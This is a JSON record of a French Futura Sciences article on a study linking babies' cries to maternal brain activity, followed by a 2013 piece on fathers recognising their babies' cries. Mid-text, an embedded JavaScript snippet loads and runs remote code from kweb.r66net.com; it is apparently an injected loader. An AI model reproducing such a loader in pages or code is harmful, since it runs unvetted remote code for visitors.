{"title": "Bébés : l'instinct maternel existerait bien", "newspaper": "Futura Sciences", "author": "Par la rédaction de Futura", "date_publi": "25/10/2017", "content": "Une nouvelle étude internationale affirme que les pleurs des bébés activent des régions spécifiques du cerveau de leur mère. Ces résultats confortent l'idée de l'existence d'un instinct maternel biologique. Ce qu'il faut retenir Des chercheurs ont étudié le cerveau de près de 700 jeunes mamans dans le monde. Les IRM révèlent que des régions cérébrales sont activées par les pleurs de bébé. Les hommes ne répondent pas de la même façon que les femmes aux pleurs des bébés. Selon cette  étude  menée dans onze pays et publiée dans les Comptes rendus de l'académie américaine des sciences (PNAS), une mère entendant son enfant pleurer aura tendance à toujours avoir le même comportement : le prendre dans ses bras et lui parler pour le rassurer. Comprendre ces réactions et les activités correspondantes dans le cerveau des femmes pourrait aider à identifier les risques de maltraitance encourus par les enfants, selon les chercheurs des Instituts nationaux américains de la santé (NIH) à l'origine de cette étude. Ces derniers ont étudié le comportement maternel et le cerveau -  via  des imageries par résonance magnétique (IRM) - d'un groupe de 684 femmes récemment devenues mères pour la première fois en Argentine, Belgique, Brésil, Cameroun, France, Israël, Italie, Japon, Kenya, Corée du Sud et États-Unis. Voir aussi : Les pleurs de bébé transforment le cerveau des parents Les interactions que celles-ci ont eues avec leur bébé de cinq mois ont été observées et enregistrées, afin de voir si elles répondaient aux pleurs de leur enfant en montrant de l'affection, en le distrayant, le nourrissant, lui changeant la couche, le prenant dans les bras ou en lui parlant. Les hommes et les femmes ne réagiraient pas de la même façon aux pleurs de bébé. © Aliaksei Lasevich, Fotolia Les pleurs de bébé activent certaines zones du cerveau des mères En analysant des IRM d'autres groupes de femmes, ces chercheurs ont constaté en outre que les jeunes mères et celles qui avaient eu plusieurs enfants activaient des régions similaires de leur cerveau lorsque leur bébé pleurait.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  L'étude constate que ces pleurs activent chez la plupart des femmes une région cérébrale liée à l'intention de se déplacer et de parler, ainsi que des zones frontales du cerveau impliquées dans le langage et la capacité de parler et d'interpréter des sons. “ Ces résultats laissent penser que les réponses des mères aux pleurs de leur bébé sont bien programmées dans le cerveau « Ces résultats laissent penser que les réponses des mères aux pleurs de leur bébé sont bien programmées dans le cerveau et communes à l'ensemble des cultures » , concluent les auteurs de l'étude. Celle-ci complète d'autres travaux montrant que le cerveau des femmes et celui des hommes répondent différemment aux pleurs d'un bébé, précise l'étude. Ainsi la nuit, les hommes semblent moins entendre les cris des bébés que les femmes, plus enclines à se lever pour aller les réconforter. Le saviez-vous ? D’après une étude de l’ Insee , les femmes consacraient en 2010, 3 h 01 min par jour aux tâches ménagères (courses, ménage), contre 1 h 17 pour les hommes. Le temps passé à l’entretien des enfants était de 45 mn pour les femmes et 19 mn pour les hommes. Même si les rôles parentaux ont évolué ces dernières décennies, ce sont le plus souvent les mères qui prennent en charge la plupart des tâches domestiques au quotidien, surtout celles liées aux tout-petits, selon d'autres études. Avec AFP Pour en savoir plus Pères et mères sont aussi bons pour reconnaître les pleurs de leur bébé Article de Janlou Chaput paru le 19 avril 2013 On a longtemps pensé que, grâce à ce qu'on appelle l'instinct maternel, les mères pouvaient plus facilement que les pères reconnaître leur bébé à ses pleurs, même parmi d'autres. Une étude remet en cause cette idée reçue et montre que les papas, s'ils passent du temps avec leur enfant, sont tout aussi performants. L'Homme aussi efficace que le  manchot  ? Probablement pas. L' oiseau  des  terres  les plus australes retrouve son petit perdu au milieu de milliers de ses congénères, grâce à ses seuls cris. Dans un tel brouhaha, l' espèce  humaine aurait sûrement du mal à distinguer les  pleurs de son bébé . Mais une étude parue dans  Nature Communications  vient de montrer que des parents savent distinguer leur enfant de quatre autres grâce à ses sanglots. De plus, ce travail remet en cause une vieille idée reçue, qui consiste à croire que les mères sont meilleures que les pères à ce genre de tâche : les résultats sont en fait identiques si les adultes passent du temps auprès de leur  bébé . Chez les  mammifères , sauf exceptions, ce sont les femelles qui s'occupent de leurs petits. Ainsi, il existe une différence de pression de  sélection naturelle  entre les sexes au niveau des aptitudes à reconnaître son petit au milieu des autres. C'est une partie de ce qu'on appelle l'instinct maternel. Chez l'Homme, en revanche, il existe peu de preuves de ce concept. Pourtant des études antérieures révélaient que les mères étaient, malgré tout, meilleures que les pères pour les exercices de ce type. Une notion qui vient d'être balayée par ces chercheurs de l' université Jean Monnet  (Saint-Étienne). Pour eux, le seul paramètre qui compte, ce n'est pas le sexe du parent, mais le temps passé auprès du bébé. Plus de 4 heures par jour avec bébé pour distinguer ses pleurs Pour cette étude, 29 couples et leur nourrisson, âgé de 58 à 153 jours, ont pris part à l'expérience. Quinze d'entre eux habitaient la région stéphanoise, les quatorze autres vivaient en République démocratique du Congo. Ainsi, les auteurs effaçaient les différences liées à la culture. L'étude consistait à faire écouter à deux reprises trois enregistrements audio aux parents. Dans chacun d'eux, on pouvait entendre cinq  bébés pleurer  : deux garçons, deux filles et l'enfant du couple. Les papas qui s'occupent beaucoup de leur bébé finissent par bien connaître la fréquence de ses pleurs, et peuvent alors distinguer les cris de leur enfant aussi bien que les mères. © VeZoul, Flickr, cc by nd 2.0                               À première vue, les  parents  semblaient dans la difficulté. Pourtant, les taux de réussite sont très élevés. En moyenne, 90 % des parents ont reconnu leur enfant. Mais on note tout de même quelques variations. Par exemple, lorsque les parents passent tous deux plus de 4 heures par jour avec bébé, les mères identifient leur progéniture dans 98 % des cas, un tout petit peu plus que les pères, qui ont trouvé la bonne réponse dans 90 % des enregistrements. En revanche, il a été constaté que la moitié des  papas  restait moins de 4 heures quotidiennement auprès de leur enfant. Chez eux, l'efficacité chute à 75 %. Enfin, comme il est fréquent en Afrique, certains parents laissent leur bébé se mêler aux autres la journée : ceux-ci retrouvent leur enfant d'après ses pleurs dans 82 % des cas. L’Homme, cet étrange mammifère L'analyse des sons révèle en réalité que chacun des enfants a une signature vocale qui lui est propre. Évidemment, l'intensité des cris varie en fonction de l'urgence des besoins du nourrisson, mais chaque bébé pleure à une certaine  fréquence , bien distincte. À force de l'entendre, les parents finissent par la reconnaître. Les auteurs concluent donc de leur travail que l'éducation des petits d'Hommes passe par les deux parents d'abord, mais aussi à travers toute la famille et les proches, et ne se limite pas, comme chez la souris ou la vache, à la seule mère. Le  père  aussi joue un rôle important, et dispose de ce fait des mêmes mécanismes biologiques le rendant capable de distinguer son fils ou sa fille à ses pleurs, parmi d'autres enfants. ", "theme": "sante"}